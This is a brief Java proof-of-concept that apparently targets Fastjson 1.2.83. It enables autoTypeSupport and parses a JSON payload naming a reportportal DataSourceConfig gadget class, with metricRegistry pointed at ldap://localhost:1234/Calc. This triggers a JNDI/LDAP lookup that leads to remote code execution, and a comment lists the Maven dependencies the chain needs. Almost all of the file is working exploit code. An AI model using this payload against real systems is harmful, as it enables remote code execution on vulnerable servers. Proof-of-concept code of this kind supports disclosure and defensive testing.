package Poc;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;
/*
    需要开启autoTypeSupport
    <parent>
        <groupId>org.springframework.boot</groupId>
        <artifactId>spring-boot-starter-parent</artifactId>
        <version>2.6.7</version>
        <relativePath/> <!-- lookup parent from repository -->
    </parent>
    <dependency>
        <groupId>com.epam.reportportal</groupId>
        <artifactId>commons-dao</artifactId>
        <version>5.0.0</version>
    </dependency>
*/
public class Poc_1_2_83 {
    public static void main(String[] args) throws Exception{
        // turn on autoTypeSupport
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        String payload = "{\"@type\": \"com.epam.ta.reportportal.config.DataSourceConfig\",\"metricRegistry\": \"ldap://localhost:1234/Calc\"}";
        JSON.parse(payload);
    }
}
